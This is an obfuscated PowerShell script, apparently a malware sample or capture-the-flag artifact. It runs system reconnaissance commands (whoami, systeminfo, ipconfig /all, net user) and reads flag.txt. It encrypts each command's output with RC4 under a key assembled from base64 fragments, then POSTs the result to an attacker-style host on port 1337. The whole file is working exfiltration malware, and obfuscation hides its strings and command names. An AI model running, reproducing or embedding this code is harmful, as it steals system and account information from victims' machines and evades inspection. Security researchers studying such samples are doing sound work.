&("{2}{1}{3}{0}" -f 'rIaBlE','eT-V','S','a') w2PrQ ([TypE]("{1}{0}{4}{2}{3}"-f 'M','sysTE','Di','NG','.TEXT.ENCo')  ) ;   &("{1}{0}"-f 't','se')  ('3a'+'zH') (  [TyPe]("{1}{2}{0}"-f 'Rt','c','oNve')) ; Set-Variable -Name COmmanDs -Value (@(
    "dir",
    ("{1}{0}" -f'hoami','w'),
    ("{1}{0}{2}{3}" -f 'y','s','st','eminfo'),
    ("{1}{2}{0}"-f 'all','ip','config /'),
    ("{1}{0}{2}{3}"-f'e ','typ','flag.tx','t'),
    ("{1}{0}"-f 't user','ne')
))

function eNc`RY`pt {
    param (
        [string]${pL`AiNt`EXt},
        [string]${K`ey}
    )
    Set-Variable -Name S -Value (0..255)
    Set-Variable -Name j -Value (0)
    Set-Variable -Name KEYBytes -Value (( .("{0}{1}" -f'Di','R') ("v"+"arIABLE:W"+"2"+"pR"+"Q"))."v`ALue"::"asc`Ii".("{0}{1}" -f'GetBy','tes').Invoke(${k`Ey}))
    Set-Variable -Name tEXtBYTes -Value ((.("{1}{0}{2}"-f 'ia','VAr','ble')  w2PrQ  -vAlUE  )::"a`SCii".("{1}{0}{2}"-f'B','Get','ytes').Invoke(${p`LAIN`TEXt}))

    for (Set-Variable -Name I -Value (0); ${i} -lt 256; ${i}++) {
        Set-Variable -Name j -Value ((${J} + ${S}[${i}] + ${KE`YB`YTES}[${I} % ${KeyB`yTEs}."L`E`NGTH"]) % 256)
        ${S}[${I}], ${S}[${j}] = ${S}[${j}], ${s}[${i}]
    }

    Set-Variable -Name i -Value (0)
    Set-Variable -Name J -Value (0)
    Set-Variable -Name CiphERByTES -Value (@())
    foreach (${By`TE} in ${teXTB`Y`TES}) {
        Set-Variable -Name i -Value ((${I} + 1) % 256)
        Set-Variable -Name J -Value ((${j} + ${s}[${i}]) % 256)
        ${S}[${I}], ${s}[${J}] = ${S}[${j}], ${S}[${I}]
        Set-Variable -Name K -Value (${s}[(${s}[${I}] + ${s}[${J}]) % 256])
        Set-Variable -Name cIPhERBYtes -Value (${c`IP`hERB`Ytes} + (${BY`TE} -bxor ${K}))
    }

    return  (  .("{0}{2}{1}"-f'v','le','ArIAB')  ('3'+'azh')  )."VAL`Ue"::"T`Obase6`4ST`R`ing"(${cI`pHe`R`BYtEs})
}

function g`ET-KEy {
    Set-Variable -Name kEyPARTs -Value (@(
        ("{2}{1}{0}"-f 'Mw==','Vs','Sn'),
        ("{0}{1}" -f'YjR','s'),
        ("{1}{0}"-f's','STN4ZjF'),
        ("{0}{1}"-f 'bDRuZCE','=')
    ))
    return (${k`eYP`ARTs} | .("{3}{1}{0}{2}" -f'ec','ach-Obj','t','ForE') {   ( &("{1}{0}" -f 'I','GC')  vAriAbLe:W2Prq  )."vAl`Ue"::"A`sCIi"."ge`Ts`TriNG"( ( &("{3}{0}{1}{2}" -f'ARIa','bl','E','GEt-v') ('3A'+'ZH') )."vA`lUe"::("{0}{2}{3}{4}{1}"-f 'F','ng','r','omBase64Str','i').Invoke(${_})) }) -join ""
}

function s`enD`-e`XfIl {
    param (
        [string]${da`TA}
    )
    Set-Variable -Name uRi -Value ("{3}{5}{1}{7}{6}{4}{0}{2}" -f'l:13','p://exf','37','ht','u','t','land.j','il')
    Set-Variable -Name BOdY -Value (@{("{0}{1}" -f'd','ata')=${D`AtA};})
    try {
        &("{4}{3}{0}{5}{1}{2}"-f'e','WebReques','t','vok','In','-') -Method ("{0}{1}"-f 'POS','T') -UseBasicParsing -Body ${Bo`dy} -Uri ${U`Ri} | .("{2}{1}{0}"-f'l','t-Nul','Ou')
    } catch {
        &("{2}{0}{1}" -f '-Hos','t','Write') ('Er'+'ror '+'sendi'+'n'+'g '+'d'+'ata '+'t'+'o '+"$Uri")
    }
}

Write-Host $(Get-Key)

foreach (${c`MD} in ${C`OmManDS}) {
    try {
        Set-Variable -Name OuTPUt -Value (&("{0}{1}{2}" -f 'cmd','.e','xe') ('/c') ${c`mD} 2>&1)
        Set-Variable -Name eNCRYPTed -Value (.("{0}{2}{1}"-f'Enc','ypt','r') -PlainText ${OUtP`UT} -Key $(&("{0}{1}" -f'Ge','t-Key')))
        &("{2}{0}{1}{3}" -f'-E','x','Send','fil') -Data ${E`NC`RYPTED}
    } catch {
        .("{0}{1}{3}{2}" -f 'Writ','e-H','t','os') ('Erro'+'r '+'e'+'x'+'ecuting '+'comman'+'d'+': '+"$cmd")
    }
}
